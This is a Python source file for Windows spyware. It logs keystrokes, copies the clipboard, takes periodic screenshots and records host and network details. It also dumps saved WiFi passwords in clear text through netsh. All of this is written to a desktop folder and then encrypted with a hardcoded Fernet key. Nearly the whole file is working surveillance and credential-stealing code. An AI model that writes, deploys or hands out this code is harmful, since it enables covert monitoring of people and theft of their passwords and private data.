import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from cryptography.fernet import Fernet
import subprocess
from requests import get
from multiprocessing import Process
from PIL import ImageGrab
import threading
from datetime import datetime

# Create an output folder on the desktop
desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop", "Output_Folder")
output_folder = os.path.join(desktop_path, 'Output_Folder')

if not os.path.exists(output_folder):
    os.mkdir(output_folder)

# Create a folder for screenshots inside the output folder
screenshots_folder = os.path.join(output_folder, 'Screenshots')
if not os.path.exists(screenshots_folder):
    os.mkdir(screenshots_folder)

# Paths and file names within the output folder
system_information = os.path.join(output_folder, "system.txt")
clipboard_information = os.path.join(output_folder, "clipboard.txt")
keys_information = os.path.join(output_folder, "key_log.txt")

# Encrypted Files
system_information_e = os.path.join(output_folder, 'e_system.txt')
clipboard_information_e = os.path.join(output_folder, 'e_clipboard.txt')
keys_information_e = os.path.join(output_folder, 'e_keys_logged.txt')

# Time Controls
time_iteration = 15
number_of_iterations_end = 2

# Key to Encrypt
key = "hNihVvPKqxM9ZPnylpYEj3sGXGnQZeYWS8Xob_Ewhc4="

# Get Computer and Network Information
def computer_information():
    try:
        with open(system_information, "a") as f:
            # Write system information to system.txt
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get('https://api.ipify.org').text
                f.write("Public IP Address: " + public_ip + "\n")
            except Exception as e:
                f.write(f"Couldn't get Public IP Address: {str(e)}\n")

            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"System: {platform.system()} {platform.version()}\n")
            f.write(f"Machine: {platform.machine()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP Address: {IPAddr}\n")

            # Add WiFi passwords directly to system.txt
            f.write("\nWiFi Passwords:\n")  # Section header for Wi-Fi passwords
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore').split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
            
            for profile in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors='ignore').split('\n')
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    try:
                        f.write(f"{profile:<30} - {results[0]}\n")
                    except IndexError:
                        f.write(f"{profile:<30} - {'No Password'}\n")
                except subprocess.CalledProcessError as e:
                    f.write(f"Error retrieving password for {profile}: {e}\n")
    except Exception as e:
        print(f"Error in computer_information: {str(e)}")


computer_information()

# Gather clipboard contents
def copy_clipboard():
    with open(clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        except Exception as e:
            f.write(f"Error copying clipboard: {e}")

# Screenshot functionality - Save all screenshots in the "Screenshots" folder with unique names
last_active_time = time.time()
inactivity_threshold = 20  # 20 seconds of inactivity before taking a screenshot
screenshot_interval = 5  # Screenshot every 5 seconds

lock = threading.Lock()

def screenshot():
    while True:
        with lock:
            if time.time() - last_active_time > inactivity_threshold:
                # Create a unique filename using the current timestamp and store in "Screenshots" folder
                timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                screenshot_filename = os.path.join(screenshots_folder, f"screenshot_{timestamp}.png")
                
                # Capture screenshot and save it with a unique filename
                im = ImageGrab.grab()
                im.save(screenshot_filename)
        time.sleep(5)

# Keylogger functionality
keys = []
count = 0
currentTime = time.time()

def write_file(keys):
    with open(keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

# Keylogger listener
def on_press(key):
    global keys, count, currentTime
    keys.append(key)
    count += 1
    currentTime = time.time()
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    global currentTime
    if key == Key.esc:
        return False
    if currentTime > stoppingTime:
        return False

# Process setup
if __name__ == "__main__":
    Process(target=screenshot, daemon=True).start()

    copy_clipboard()

    # Time controls for keylogger
    number_of_iterations = 0
    stoppingTime = time.time() + time_iteration

    while number_of_iterations < number_of_iterations_end:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        if currentTime > stoppingTime:
            with open(keys_information, "w") as f:
                f.write(" ")
            number_of_iterations += 1
            stoppingTime = time.time() + time_iteration

    # Encrypt files
    files_to_encrypt = [system_information, clipboard_information, keys_information]
    encrypted_file_names = [system_information_e, clipboard_information_e, keys_information_e]
    
    for i, encrypting_file in enumerate(files_to_encrypt):
        file_path_to_encrypt = encrypting_file
        if os.path.exists(file_path_to_encrypt):
            with open(file_path_to_encrypt, 'rb') as f:
                data = f.read()
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
            with open(encrypted_file_names[i], 'wb') as f:
                f.write(encrypted)
        else:
            print(f"File {encrypting_file} does not exist, skipping encryption.")

    time.sleep(120)
